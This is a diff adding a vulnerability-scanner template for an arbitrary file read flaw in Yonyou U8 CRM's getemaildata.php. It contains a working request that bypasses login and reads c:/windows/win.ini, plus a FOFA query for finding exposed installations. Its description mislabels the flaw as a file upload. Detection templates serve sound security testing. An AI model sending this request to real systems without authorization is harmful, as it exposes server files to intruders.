@@ -1,0 +1,22 @@
+id: yonyou-u8-crm-getemaildata-fileread
+
+info:
+  name: 用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞
+  author: peiqi
+  severity: high
+  verified: true
+  description: |
+    用友 U8 CRM客户关系管理系统 getemaildata.php 文件存在任意文件上传漏洞，攻击者通过漏洞可以获取到服务器权限，攻击服务器
+    FOFA: body="用友U8CRM"
+  reference:
+    - https://peiqi.wgpsec.org/wiki/oa/用友OA/用友%20U8%20CRM客户关系管理系统%20getemaildata.php%20任意文件上传漏洞.html
+  tags: yonyou,fileread
+  created: 2023/08/13
+
+rules:
+  r0:
+    request:
+      method: GET
+      path: /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini
+    expression: response.status == 200 && response.body.bcontains(b"bit app support") 
+expression: r0()
